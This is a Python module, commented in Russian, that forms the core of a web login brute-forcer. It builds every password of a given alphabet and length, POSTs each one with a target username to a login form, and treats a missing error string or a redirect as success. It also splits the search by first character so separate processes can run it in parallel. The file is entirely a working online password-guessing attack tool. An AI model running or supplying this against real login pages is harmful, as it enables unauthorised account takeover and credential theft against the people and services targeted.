"""Модуль модели (Model) для веб-брутфорса.

Содержит бизнес-логику: генерацию комбинаций и отправку HTTP-запросов.
"""

import itertools
import requests


class BruteForceModel:
    """Управляет пространством поиска паролей и сетевым взаимодействием."""

    def __init__(self, target_url, username, alphabet, password_length):
        """Инициализирует параметры атаки.

        Args:
            target_url (str): URL-адрес формы авторизации.
            username (str): Логин целевого пользователя.
            alphabet (str): Строка со всеми доступными символами.
            password_length (int): Длина подбираемого пароля.
        """
        self.target_url = target_url
        self.username = username
        self.alphabet = alphabet
        self.password_length = password_length

    def check_credentials(self, password):
        """Отправляет POST-запрос для проверки пары логин/пароль.

        Args:
            password (str): Кандидат на пароль.

        Returns:
            bool: True, если авторизация успешна, иначе False.
        """
        # Payload (полезная нагрузка) соответствует названиям полей в HTML-форме
        payload = {"username": self.username, "password": password}

        try:
            # Выполняем сетевой запрос с таймаутом, чтобы не зависнуть при сбое
            response = requests.post(
                self.target_url, data=payload, timeout=5, allow_redirects=True
            )

            # Базовые маркеры успешной авторизации:
            # 1. Текст ошибки отсутствует на странице ответа
            error_marker = "Invalid credentials"
            if (
                response.status_code == 200
                and error_marker not in response.text
            ):
                return True

            # 2. Сервер выполнил редирект (например, перенаправил в личный кабинет)
            if len(response.history) > 0 and response.history[0].status_code in [
                301,
                302,
            ]:
                return True

        except requests.RequestException:
            # Защита от падения программы при сетевых сбоях
            return False

        return False

    def search_sector(self, prefix):
        """Метод для выполнения внутри отдельного независимого процесса.

        Фиксирует первый символ (префикс) и перебирает оставшуюся часть пароля.

        Args:
            prefix (str): Стартовый символ сектора перебора.

        Returns:
            str/None: Возвращает строку пароля при успехе или None.
        """
        remaining_length = self.password_length - len(prefix)

        # Быстрый генератор комбинаций на уровне C-расширения Python
        for suffix_tuple in itertools.product(
            self.alphabet, repeat=remaining_length
        ):
            password = prefix + "".join(suffix_tuple)

            if self.check_credentials(password):
                return password  # Цель достигнута, возвращаем результат

        return None